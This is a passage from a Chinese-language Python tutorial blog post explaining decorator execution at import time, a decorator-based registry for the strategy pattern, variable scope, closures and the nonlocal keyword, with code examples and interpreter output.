<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python3 registration.py</span></span><br><span class="line">running register(&lt;function f1 at 0x10d318d08&gt;)</span><br><span class="line">running register(&lt;function f2 at 0x10d318c80&gt;)</span><br><span class="line">running main()</span><br><span class="line">registry -&gt; [&lt;function f1 at 0x10d318d08&gt;, &lt;function f2 at 0x10d318c80&gt;]</span><br><span class="line">running f1()</span><br><span class="line">running f2()</span><br><span class="line">running f3()</span><br></pre></td></tr></table></figure>

<p>注意到 <code>register</code> 在模块中其他函数运行前执行了两次。当 <code>register</code> 被调用时，它接受了一个被装饰的函数对象作为参数，如：<code>&lt;function f1 at 0x10d318d08&gt;</code>。</p>
<p>模块被加载后，<code>registry</code> 保存了两个被装饰函数 <code>f1</code>，<code>f2</code>的引用。这些函数，还有 <code>f3</code> 只有在 <code>main</code> 函数显式调用后才执行。如果 registration.py 被导入（而不是执行脚本），那么输出为：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; import registration</span></span><br><span class="line">running register(&lt;function f1 at 0x10d318d08&gt;)</span><br><span class="line">running register(&lt;function f2 at 0x10d318c80&gt;)</span><br></pre></td></tr></table></figure>

<p>这时，如果我们查看 <code>registry</code>，可以看到：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; registration.registry</span></span><br><span class="line">[&lt;function f1 at 0x10d318d08&gt;, &lt;function f2 at 0x10d318c80&gt;]</span><br></pre></td></tr></table></figure>

<p>上面的例子是为了强调函数装饰器（function decorators）在模块被导入的时候马上执行，但是被装饰的函数（decorated function） 仅仅在他们被显式调用后才执行。这就是 Python 老炮们常说的 <code>导入时间（import time）</code> 和 <code>运行时间（runtime）</code>。</p>
<p>考虑装饰器在真实代码里的普遍使用方式，上面的例子有两个问题：</p>
<ol>
<li>装饰器（decorator）和被装饰函数（decorated function）被定义在了同一个模块中。一个真实的装饰器通常被定义在单独的模块中并修饰其他模块中的函数。</li>
<li><code>register</code> 装饰器返回了被当做参数传入的同一个函数。在实践中，大多数装饰器都定义一个内部函数并返回它。</li>
</ol>
<p>尽管 <code>register</code> 装饰器返回了没有被修改的函数，这样的方法其实是有用武之地的。许多 Python Web Framework 都使用相似的方法来将函数添加到某注册机制中，例如，一个注册机将 URL 映射到生成 HTTP 响应的函数。这样的注册过程可能不会修改被装饰函数。</p>
<h2 id="使用装饰器重构策略模式"><a href="#使用装饰器重构策略模式" class="headerlink" title="使用装饰器重构策略模式"></a>使用装饰器重构策略模式</h2><p>首先看一段使用函数是“first-class object”这一特点实现策略模式的代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> namedtuple</span><br><span class="line"></span><br><span class="line">Customer = namedtuple(<span class="string">"Customer"</span>, <span class="string">"name fidelity"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LineItem</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, product, quantity, price)</span>:</span></span><br><span class="line">        self.product = product</span><br><span class="line">        self.quantity = quantity</span><br><span class="line">        self.price = price</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">total</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.price * self.quantity</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Order</span>:</span> </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, customer, cart, promotion=None)</span>:</span></span><br><span class="line">        self.customer = customer</span><br><span class="line">        self.cart = list(cart)</span><br><span class="line">        self.promotion = promotion</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">total</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> hasattr(self, <span class="string">"__total"</span>):</span><br><span class="line">            self.__total = sum(item.total() <span class="keyword">for</span> item <span class="keyword">in</span> self.cart)</span><br><span class="line">        <span class="keyword">return</span> self.__total</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">due</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.promotion <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            discount = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            discount = self.promotion(self)</span><br><span class="line">        <span class="keyword">return</span> self.total() - discount</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        fmt = <span class="string">"&lt;Order total: &#123;:2f&#125;&gt; due: &#123;:.2f&#125;"</span></span><br><span class="line">        <span class="keyword">return</span> fmt.format(self.total(), self.due())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fidelity_promo</span><span class="params">(order)</span>:</span></span><br><span class="line">    <span class="string">"""5% discount for customers with 1000 or more fidelity points"""</span></span><br><span class="line">    <span class="keyword">return</span> order.total() * <span class="number">.05</span> <span class="keyword">if</span> order.customer.fidelity &gt;= <span class="number">1000</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bulk_item_promo</span><span class="params">(order)</span>:</span></span><br><span class="line">    <span class="string">"""10% discount for each LineItem with 20 or more units"""</span></span><br><span class="line">    discount = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> order.cart:</span><br><span class="line">        <span class="keyword">if</span> item.quantity &gt;= <span class="number">20</span>:</span><br><span class="line">            discount += item.total() * <span class="number">.1</span></span><br><span class="line">    <span class="keyword">return</span> discount</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">large_order_promo</span><span class="params">(order)</span>:</span></span><br><span class="line">    <span class="string">"""7% discount for orders with 10 or more distince items"""</span></span><br><span class="line">    distinct_items = &#123; item.product <span class="keyword">for</span> item <span class="keyword">in</span> order.cart &#125;</span><br><span class="line">    <span class="keyword">if</span> len(distinct_items) &gt;= <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> order.total() * <span class="number">.07</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">promos = [fidelity_promo, bulk_item_promo, large_order_promo]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">best_promo</span><span class="params">(order)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> max(promo(order) <span class="keyword">for</span> promo <span class="keyword">in</span> promos)</span><br></pre></td></tr></table></figure>

<p>上面这段代码的只要问题在于函数名的重复，每个计算优惠的策略都以<code>_promo</code>结尾。<code>best_promo</code>函数使用<code>promos</code>列表来决定最大的优惠力度。这种命名上的重复的问题在于，当新添加了计算优惠的函数时，我们很可能会忘记将它添加到<code>promos</code>中。这种情况下，<code>best_promo</code>会忽略新的优惠计算函数而产生 bug。下面的代码中，我们使用装饰器重构代码来解决这个问题：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">promos = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">promotion</span><span class="params">(promo_func)</span>:</span></span><br><span class="line">    promos.append(promo_func)</span><br><span class="line">    <span class="keyword">return</span> promo_func</span><br><span class="line"></span><br><span class="line"><span class="meta">@promotion</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fidelity</span><span class="params">(order)</span>:</span></span><br><span class="line">    <span class="string">"""5% discount for customers with 1000 or more fidelity points"""</span></span><br><span class="line">    <span class="keyword">return</span> order.total() * <span class="number">.05</span> <span class="keyword">if</span> order.customer.fidelity &gt;= <span class="number">1000</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@promotion</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bulk_item</span><span class="params">(order)</span>:</span></span><br><span class="line">    <span class="string">"""10% discount for each LineItem with 20 or more units"""</span></span><br><span class="line">    discount = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> order.cart:</span><br><span class="line">        <span class="keyword">if</span> item.quantity &gt;= <span class="number">20</span>:</span><br><span class="line">            discount += item.total() * <span class="number">.1</span></span><br><span class="line">    <span class="keyword">return</span> discount</span><br><span class="line"></span><br><span class="line"><span class="meta">@promotion</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">large_order</span><span class="params">(order)</span>:</span></span><br><span class="line">    <span class="string">"""7% discount for orders with 10 or more distince items"""</span></span><br><span class="line">    distinct_items = &#123; item.product <span class="keyword">for</span> item <span class="keyword">in</span> order.cart &#125;</span><br><span class="line">    <span class="keyword">if</span> len(distinct_items) &gt;= <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> order.total() * <span class="number">.07</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">best_promo</span><span class="params">(order)</span>:</span></span><br><span class="line">    <span class="string">"""Select best discount available"""</span></span><br><span class="line">    <span class="keyword">return</span> max(promo(order) <span class="keyword">for</span> promo <span class="keyword">in</span> promos)</span><br></pre></td></tr></table></figure>

<p>这个解决方案的有点在于：</p>
<ol>
<li>计算优惠的策略函数不再需要使用特殊的名字（比如，不在需要以<code>_promo</code>结尾）。</li>
<li>装饰器<code>@promotion</code>强调了函数的作用，而且可以很容易地暂时取消一种优惠策略：注释掉装饰器就好。</li>
<li>计算优惠的策略可能被定义在其他模块，或者系统的任何地方。不管函数被定义在哪里，都知道用<code>@promotion</code>修饰就好了。</li>
</ol>
<p>大多数装饰器（decorator）都会改变被装饰函数（decorated function）。它们通过定义并返回一个内部函数来替代被装饰函数。使用了内部函数的代码大多依赖于闭包（closure）来正确运行。为了理解闭包，我们得先退后一步，看看 Python 中的变量作用域。</p>
<h2 id="变量作用域的规则"><a href="#变量作用域的规则" class="headerlink" title="变量作用域的规则"></a>变量作用域的规则</h2><p>在下面的例子中，我们定义并测试了一个读取两个变量的函数：一个局部变量<code>a</code>，被定义为函数的参数；一个没有被定义在函数内的变量<code>b</code>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">f1</span><span class="params">(a)</span>:</span></span><br><span class="line">    		print(a)</span><br><span class="line">    		print(b)</span><br><span class="line">    </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f1(<span class="number">3</span>)</span><br><span class="line"><span class="number">3</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt; </span><br><span class="line">File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">3</span>, <span class="keyword">in</span> f1 </span><br><span class="line">NameError: <span class="keyword">global</span> name <span class="string">'b'</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br></pre></td></tr></table></figure>

<p>我们对于代码运行出现的错误不会感到意外。如果我们首先为全局变量<code>b</code>赋值，然后再调用<code>f1</code>，代码就可以正确工作了：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; b = 6</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; f1(3)</span></span><br><span class="line">3</span><br><span class="line">6</span><br></pre></td></tr></table></figure>

<p>下面，来看一个可能会让你吃惊的例子。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = <span class="number">6</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">f2</span><span class="params">(a)</span>:</span></span><br><span class="line">    		print(a)</span><br><span class="line">    		print(b)</span><br><span class="line">    		b = <span class="number">9</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f2(<span class="number">3</span>)</span><br><span class="line"><span class="number">3</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt; </span><br><span class="line">File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">3</span>, <span class="keyword">in</span> f2 </span><br><span class="line">UnboundLocalError: local variable <span class="string">'b'</span> referenced before assignment</span><br></pre></td></tr></table></figure>

<p>注意到 3 被正确打印了，这说明 <code>print(a)</code> 被执行了。但是第二句 <code>print(b)</code> 没有运行。很多人有会很意外，认为 6 应该被打印，因为局部变量 <code>b</code> 在全局变量 <code>b</code> 被打印之后被赋值。</p>
<p>但事实上，当 Python 编译函数时，决定 <code>b</code> 是局部变量，因为它在函数内被赋值了。生成的二进制字节码也反映了这一点，<code>b</code> 会被从本地环境中获取。之后，当试图获取局部变量 <code>b</code> 的值得时候，会发现 <code>b</code> 未被绑定。</p>
<p>这并不是一个 bug，而是一个设计选择：Python 不要求用户声明变量，但是假设在函数内被赋值的变量是局部变量。这就比 JavaScript 强很多了，JavaScript 也不要求声明变量，但是如果你忘记了用 <code>var</code> 来声明局部变量，你可能会误用一个全局变量。</p>
<p>如果我们希望解析器将在函数内被赋值的变量 <code>b</code> 作为全局变量，我们使用 <code>global</code> 关键字来声明：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">f3</span><span class="params">(a)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> b</span><br><span class="line">        print(a)</span><br><span class="line">        print(b)</span><br><span class="line">        b = <span class="number">9</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f3(<span class="number">3</span>)</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line"><span class="number">9</span></span><br></pre></td></tr></table></figure>

<h2 id="闭包（Closure）"><a href="#闭包（Closure）" class="headerlink" title="闭包（Closure）"></a>闭包（Closure）</h2><p>在技术博客里面，闭包常常与匿名函数混淆。这是一个历史原因：在使用匿名函数之前，在函数中定义另外一个函数并不常见。闭包仅仅在你定义嵌套函数的时候才有意义。所以很多人同时学习这两个概念。</p>
<p>实际上，闭包是一个拥有拓展作用域的函数，闭包的作用域包含了在函数内被引用但是却没有被定义在函数中的非全局变量。</p>
<p>这个概念不太好懂，我们最好还是通过例子来理解它。</p>
<p>考虑一个计算一个增长序列均值的函数<code>avg</code>，例如股票在整个历史中的平均价格。每天都会有新的价格加入序列，函数<code>avg</code>会计算到目前为止的平均值。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>avg(<span class="number">10</span>)</span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>avg(<span class="number">11</span>)</span><br><span class="line"><span class="number">10.5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>avg(<span class="number">12</span>)</span><br><span class="line"><span class="number">11.0</span></span><br></pre></td></tr></table></figure>

<p><code>avg</code> 如何保存之前的值呢？</p>
<p>我们首先看一个使用类来实现的版本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Averager</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.series = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self, new_value)</span>:</span></span><br><span class="line">        self.series.append(new_value)</span><br><span class="line">        total = sum(self.series)</span><br><span class="line">        <span class="keyword">return</span> total / len(self.series)</span><br></pre></td></tr></table></figure>

<p><code>Averager</code> 类的实例是可调用的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>avg = Averager()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>avg(<span class="number">10</span>)</span><br><span class="line"><span class="number">10.0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>avg(<span class="number">11</span>)</span><br><span class="line"><span class="number">10.5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>avg(<span class="number">12</span>)</span><br><span class="line"><span class="number">11.0</span></span><br></pre></td></tr></table></figure>

<p>我们再来看一个函数式的例子，它使用了高阶函数<code>make_averager</code>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_averager</span><span class="params">()</span>:</span></span><br><span class="line">    series = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">averager</span><span class="params">(new_value)</span>:</span></span><br><span class="line">        series.append(new_value)</span><br><span class="line">        total = sum(series)</span><br><span class="line">        <span class="keyword">return</span> total / len(series)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> averager</span><br></pre></td></tr></table></figure>

<p>被调用时，<code>make_averager</code> 返回一个 <code>averager</code> 函数对象。每次 <code>averager</code> 被调用，它将被传入的参数添加到 <code>series</code> 中，并且计算现在的平均值。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>avg = make_averager()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>avg(<span class="number">10</span>)</span><br><span class="line"><span class="number">10.0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>avg(<span class="number">11</span>)</span><br><span class="line"><span class="number">10.5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>avg(<span class="number">12</span>)</span><br><span class="line"><span class="number">11.0</span></span><br></pre></td></tr></table></figure>

<p>注意这两种方案的相似之处：我们调用 <code>Averager()</code> 或者 <code>make_averager()</code> 来得到一个可调用对象 <code>avg</code>，它会更新历史数据并计算目前的平均值。</p>
<p><code>Averager</code> 中的 <code>avg</code> 保存历史记录的方式很明显：<code>self.series</code> 实例属性。但是<code>make_averager</code> 中的 <code>avg</code> 是如何找到 <code>series</code> 的呢？</p>
<p>注意到 <code>series</code> 是 <code>make_averager</code> 的局部变量，因为它在 <code>make_averager</code> 中被初始化。但是当调用 <code>avg(10)</code>时，<code>make_averager</code> 已经返回了，它的局部作用域已经被回收。</p>
<p>在 <code>averager</code> 中，<code>series</code> 是自由变量（free variable），这个属于的意思是没有被绑定到该函数局部作用域中的变量。</p>
<p><img src="/images/2017-7-11/Screen%20Shot%202017-07-09%20at%2010.11.24.png" alt="Screen Shot 2017-07-09 at 10.11.24"></p>
<p>检查被返回的 <code>averager</code> 对象，我们可以看到 Python 是如果将局部变量和自由变量保存在 <code>__code__</code> 属性中的。<code>__code__</code> 属性代表了函数内容被编译后的结果。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>avg.__code__.co_varnames</span><br><span class="line">(<span class="string">'new_value'</span>, <span class="string">'total'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>avg.__code__.co_freevars</span><br><span class="line">(<span class="string">'series'</span>,)</span><br></pre></td></tr></table></figure>

<p>对 <code>series</code> 的绑定被保存在函数的 <code>__closure__</code> 属性中。<code>avg.__clousre__</code>中的每个元素对应 <code>avg.__code__.co_freevars</code> 中的一个名字。这些元素被称为 <code>cells</code>，它们有保存了真实值的属性 <code>cell_contents</code>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>avg.__code__.co_freevars</span><br><span class="line">(<span class="string">'series'</span>,)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>avg.__closure__</span><br><span class="line">(&lt;cell at <span class="number">0x110f4cc78</span>: list object at <span class="number">0x11104fb88</span>&gt;,)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>avg.__closure__[<span class="number">0</span>].cell_contents</span><br><span class="line">[<span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>]</span><br></pre></td></tr></table></figure>

<p>总结一下：闭包是持有了对自由变量绑定的函数，自由变量在函数被定义时就存在了，所有它们可以在作用域消失的时候仍然可以被使用。</p>
<p>注意只有当一个函数被嵌套到另外一个函数内时，它才需要处理外部作用域的非全局变量。</p>
<h2 id="nonlocal-修饰符"><a href="#nonlocal-修饰符" class="headerlink" title="nonlocal 修饰符"></a>nonlocal 修饰符</h2><p>我们之前实现的 <code>make_averager</code> 不太高效。我们在数组中保存了所有出现过的值，然后在每次调用 <code>averager</code> 时会计算所有值的和。一个更好的实现应该仅仅保存总的和，以及到目前为止元素的个数，然后利用这两个值来计算平均值。</p>
<p>下面的代码是错误的，我们可以看看它错在哪里：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_averager</span><span class="params">()</span>:</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    total = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">averager</span><span class="params">(new_value)</span>:</span></span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        total += new_value</span><br><span class="line">        <span class="keyword">return</span> total / count</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> averager</span><br></pre></td></tr></table></figure>

<p>如果我们运行这段代码，会打印出错误信息：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>avg = make_averager()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>avg(<span class="number">10</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">UnboundLocalError: local variable <span class="string">'count'</span> referenced before assignment</span><br></pre></td></tr></table></figure>

<p>出错的原因在于， 当 <code>count</code> 是数字或不可变类型时，<code>count += 1</code> 实际上相当于 <code>count = count + 1</code>。所以我们实际上是在 <code>averager</code> 的函数内部为 <code>count</code> 赋值，那么这一步就将 <code>count</code> 变为了局部变量。<code>total</code> 也有同样的问题。</p>
<p>我们在之前的例子总没有这样的问题，因为我们从来没有为 <code>series</code> 赋值，我们仅仅通过调用 <code>series.append</code> 在增加元素，并计算 <code>sum</code> 和 <code>len</code>。我们利用了列表是可变类型的特点。</p>
<p>但是对于像数字、字符、tuple这样的不可变类型，我们只可以读数据，但是永远都不能够更新它。如果我们试着重新绑定它们，像 <code>count = count + 1</code>，那么你就是在隐式地创建局部变量 <code>count</code>。这样的话，<code>count</code> 就不再是自由变量，所以它没有被保存在闭包中。</p>
<p>为了解决这个问题，Python 3 引入了新的关键字 <code>nonlocal</code>。它让我们将变量标记为自由变量，即使该变量在函数内部被赋值。如果给 <code>nonlocal</code> 变量赋值，那么在闭包中保存的变量绑定也会改变。所以，<code>make_averager</code> 的正确是实现应该是：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_averager</span><span class="params">()</span>:</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    total = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">averager</span><span class="params">(new_value)</span>:</span></span><br><span class="line">        <span class="keyword">nonlocal</span> count, total</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        total += new_value</span><br><span class="line">        <span class="keyword">return</span> total / count</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> averager</span><br></pre></td></tr></table></figure>

<p>现在，我们介绍了 Python 中的闭包，我们可以利用内嵌函数来实现装饰器了。</p>
